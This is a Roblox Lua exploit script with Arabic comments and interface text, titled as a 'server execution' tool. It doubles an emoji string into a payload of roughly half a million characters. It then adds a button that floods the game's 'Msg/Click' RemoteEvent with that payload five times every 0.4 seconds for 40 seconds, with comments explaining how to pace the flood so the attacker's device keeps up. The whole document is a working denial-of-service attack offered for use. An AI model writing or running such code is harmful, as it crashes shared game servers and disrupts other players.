-- [[ ☢️ THE FINAL EXECUTION: 40s POWER ]]
-- [[ القوة: إعدام السيرفر | الرام: مراقب | المدة: 40 ثانية ]]

local Remote = game:GetService("ReplicatedStorage"):WaitForChild("Msg"):WaitForChild("Click")

-- 1. تجهيز "الكتلة المدمرة" (التي تسبب Gameplay Paused فعلياً)
local rawData = "☣️"
for i = 1, 19 do 
    rawData = rawData .. rawData
end

local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 240, 0, 100)
MainFrame.Position = UDim2.new(0.5, -120, 0.15, 0)
MainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
MainFrame.BackgroundTransparency = 0.3
Instance.new("UICorner", MainFrame)

local FireBtn = Instance.new("TextButton", MainFrame)
FireBtn.Size = UDim2.new(1, -20, 1, -20)
FireBtn.Position = UDim2.new(0, 10, 0, 10)
FireBtn.Text = "إعدام السيرفر 💀" 
FireBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
FireBtn.TextColor3 = Color3.new(1, 1, 1)
FireBtn.Font = Enum.Font.SourceSansBold
FireBtn.TextSize = 22
Instance.new("UICorner", FireBtn)

local IsRunning = false

FireBtn.MouseButton1Click:Connect(function()
    if IsRunning then return end
    IsRunning = true
    
    local timeLeft = 40
    
    -- [ المحرك الجبار ]
    task.spawn(function()
        while timeLeft > 0 and IsRunning do
            -- نرسل 5 طلقات عملاقة جداً (صدمة للسيرفر)
            for i = 1, 5 do
                task.spawn(function()
                    pcall(function()
                        Remote:FireServer(rawData)
                    end)
                end)
            end
            
            -- ** النقطة الأهم **: ننتظر 0.4 ثانية
            -- هذا الوقت كافٍ ليرسل هاتفك البيانات ويمسحها من الرام قبل الدفعة التالية
            task.wait(0.4) 
        end
    end)

    -- [ العداد ]
    task.spawn(function()
        while timeLeft > 0 do
            FireBtn.Text = "☣️ جاري الإعدام: " .. timeLeft .. "s"
            FireBtn.BackgroundColor3 = (timeLeft % 2 == 0) and Color3.new(0.5, 0, 0) or Color3.new(0.8, 0, 0)
            task.wait(1)
            timeLeft = timeLeft - 1
        end
        
        IsRunning = false
        FireBtn.Text = "تم الإعدام بنجاح ✅"
        FireBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
        task.wait(2)
        FireBtn.Text = "إعدام السيرفر 💀"
        FireBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
    end)
end)

print("🔥 تم تفعيل نظام الإعدام بـ 40 ثانية. القوة عادت!")
